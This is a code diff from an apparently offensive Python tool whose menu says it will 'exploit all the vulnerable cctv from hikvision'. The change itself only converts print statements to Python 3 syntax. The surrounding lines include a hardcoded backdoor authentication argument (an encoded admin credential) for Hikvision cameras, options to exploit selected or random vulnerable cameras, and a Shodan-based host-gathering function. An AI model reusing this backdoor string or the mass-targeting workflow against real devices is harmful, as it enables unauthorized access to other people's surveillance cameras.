@@ -27,14 +27,14 @@ host = open(path + '/host.txt' , 'r').read().splitlines()
 vuln_host = open(path + '/vuln_host.txt', 'r').read().splitlines()
 BackdoorAuthArg = "auth=YWRtaW46MTEK"
 def usage():
-    print t.yellow(""" ____  ____   _   __                       __           _   _    
+    print( t.yellow(""" ____  ____   _   __                       __           _   _    
 |_   ||   _| (_) [  |  _                  [  |         (_) / |_  
   | |__| |   __   | | / ]  _   __  _ .--.  | |  .--.   __ `| |-' 
   |  __  |  [  |  | '' <  [ \ [  ][ '/'`\ \| |/ .'`\ \[  | | |   
  _| |  | |_  | |  | |`\ \  > '  <  | \__/ || || \__. | | | | |,  
 |____||____|[___][__|  \_][__]`\_] | ;.__/[___]'.__.' [___]\__/  
-                                  [__|                           """)
-    print t.green("""+------------------------------------------------------------+
+                                  [__|                           """))
+    print( t.green("""+------------------------------------------------------------+
 |     exploit all the vulnerable cctv from hikvision         |
 |------------------------------------------------------------|
 | Usage:                                                     |
@@ -46,7 +46,7 @@ def usage():
 | 6. select a CCTV'S ip to exploit                           |
 | 7. random exploit CCTV from the vuln list                  |
 | 8. install dependency                                      |
-+------------------------------------------------------------+""")
++------------------------------------------------------------+"""))
                                                                 
 def gather_host_shodan():
     api_shodan_key = open(path + "/api.txt","r").read()
